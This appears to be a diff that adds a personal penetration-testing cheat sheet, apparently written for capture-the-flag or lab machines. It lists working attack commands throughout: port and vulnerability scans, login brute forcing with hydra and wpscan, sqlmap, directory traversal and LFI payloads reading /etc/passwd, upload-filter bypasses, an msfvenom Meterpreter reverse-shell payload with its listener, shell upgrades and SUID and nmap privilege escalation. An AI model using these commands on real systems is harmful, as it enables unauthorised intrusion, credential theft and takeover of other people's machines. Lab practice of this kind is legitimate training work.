@@ -1,0 +1,174 @@
+Iist active  hosts in local network
+netdiscover -i eth0
+Vulnerabilty scanning
+nikto -h 192.168.1.106
+Use zenmap/nmap
+nmap -sS -sV -O -A 192.168.1.106
+for UDP scan
+nmap -sU 10.10.10.105
+nmap -sV -sC -oA nmap/vault 10.10.10.109
+
+RPC login with Null session
+rpcclient -U "" 192.168.1.106
+press {ENTER} for password
+
+Check for robots.txt file
+
+Change Host value to domain name/localhost using Burp to check if HTTP response is changing.
+
+Directory bruteforce search
+dirb http://192.168.1.106
+gobuster -u http://10.10.10.105 -w /usr/share/wordlists/durbuster/directory-list-2.3-medium.txt
+gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/durbuster/directory-list-2.3-medium.txt -x html,php -o gobuster-sparklays.txt -t 50
+
+Check the comments in the page source
+Check for LFI
+Check for Directory traversal path
+../../../../../../../etc/passwd
+../../../../../../../etc/passwd%00
+http://192.168.1.106?lang=php://filter/convert.base64-encode/resource=shell
+
+Login Bruteforce
+wfuzz -u http://10.10.10.109/sparklays/admin.php -H "Host: FUZZ" -w /usr/share/seclists/Discovery/DNS/namelist.txt --hc 200 –-hh 422 
+
+Username Brute force
+hydra -V -L wordlist.dic -p random_password 192.168.1.108 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+Vulnerability Scan and password Brute force  on wordpress site
+wpscan –-url 192.168.1.108 –-wordlist /home/srinivas/Desktop/wordlist.dic –username Elliot
+
+SQLmap
+capture the request in Burp, [right-click] on request bidy > "Copy to File" > login.req
+sqlmap -r login.req --batch
+
+Check if any upload option is present.
+if file type is not allowing, then change "Content-Type" to image/jpeg or image/gif using Burp repeater.
+if still the file is not getting upload, try to add GIF8; as the first line of the file being uploaded and retry upload.
+Change the extension of file to .gif.php5 and try.
+
+Always URLEncode the Values in HTTP requests.
+
+SNMP Brute force for community string(i.e., password)
+nmap -sU –-script snmp-brute -p 161 10.10.10.105
+
+Check command executing on target by sending wrong command. Output will show command synatx.
+
+Metasploit create reverse_https payload:
+msfvenom -p windows/meterpreter/reverse_https set lhost=192.168.0.107 set lport=443 -f exe > /root/Desktop/payload.exe
+
+Metasploit run metrepreter using multi-handler
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost 192.168.0.107
+set lport 443
+exploit
+[Now meterpreter will be in listening mode on attacker machine]
+Upload the payload.exe file generated using msfvenom on to the victim machine and run
+Now the reverse shell should be connected to attacker meterpreter session
+
+---
+
+SSH login
+ssh root@192.168.1.106
+ssh root@192.168.1.106 -p 3333
+ssh user1@RemoteHost
+SSH Port forwarding
+~C[Enter] to go back to ssh>
+help command will show all available options
+-L 8001:192.168.122.4:80
+For Dyamic port forwading using SOCKS5 proxy
+-D 1080
+Allow any host from client network (-g) to forward from 2001 port on ssh_client host to 143 port on Remote HostD via Remote HostB
+ssh -g -L2001:HostD:143 user1@HostB
+Allow only applications from localhost machine to forward via 2001 port  to 143 port on Remote HostB
+ssh -L2001:localhost:143 user1@HostB
+Remote forwarding from app_client:2001 on sshd(HostB) to app_server:143 on ssh_client(HostA)
+ssh -R2001:localhost:143 user1@HostB
+Find for usernames in the page source and try logging in as them with the known and obtained passwords
+
+SNMP enumeration
+snmpwalk -c <community string(i.e., password)> -v 2c 10.10.10.105
+
+Spawn to shell using oon
+import pty
+pty.spawn("bin/bash")
+in a single line:
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+Make shell more interactive after spawnned using Python
+CTRL+Z to go to background
+stty raw -echo
+[F Z Enter]
+[Enter] [Enter]
+To enable clear screen using CTRL+L
+export TERM=xterm
+
+Switch to user "user2"
+su - user2
+
+List active connections
+netstat -auntp
+
+List running processes
+ps -elf
+
+Kill a process
+kill <process ID>
+
+List only the files in current directory and hide all error outputs
+find . -type f -ls 2>/dev/null
+
+Print file in Hex format
+xxd file.txt
+
+Check Proxychains configuration
+cat /etc/proxychains.conf
+
+Connect using proxy chains
+proxychains curl 192.168.122.4
+
+Capture TCP traffic
+tcpdump -i any -s 65535 -c 30
+
+List accessible files in interactive mode
+find / -perm -4000 2>/dev/null
+
+Privilege escalation:
+If nmap is installed in target machine
+nmap –-interactive
+!sh
+id
+
+Version of Linux
+cat /etc/issue
+
+Known current user details
+id
+
+Check for paswword file
+cat /etc/passwd
+
+Search for file
+locate flag2.txt
+
+List permissions of files in directory
+ls -al /home/devops/
+
+Find all the files belongs to user "devops"
+find / -user devops
+
+Use reverse shell and put it in the other user owned file which read and write access to current logged in user
+
+Start listener in attacker machine
+nc -nlvp 1234
+
+Restart the attacker machine if you placed rev. shell in startup file
+
+Check what commands can be run
+sudo -l
+
+Start Apache server (will serve files in /var/www/html/)
+service apache2 start
+
+
+
